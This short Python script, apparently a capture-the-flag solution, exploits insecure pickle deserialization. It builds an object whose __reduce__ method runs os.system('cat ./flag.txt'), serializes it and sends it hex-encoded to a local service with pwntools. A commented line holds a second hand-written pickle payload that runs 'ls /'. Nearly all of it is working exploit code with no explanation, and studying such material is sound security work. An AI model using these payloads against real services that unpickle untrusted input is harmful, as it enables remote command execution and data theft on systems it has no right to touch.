# useful article: https://zhuanlan.zhihu.com/p/89132768

import os 
import pickle
import pickletools
from pwn import *

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat ./flag.txt',))



serialized_data = pickle.dumps(Exploit(), protocol=0)
# serialized_data_no_reduce = payload = b'\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb.'
print(pickletools.dis(serialized_data))

p = remote('localhost', 13202)
p.sendlineafter(b'data:\n', serialized_data.hex().encode())
print(p.recvline())
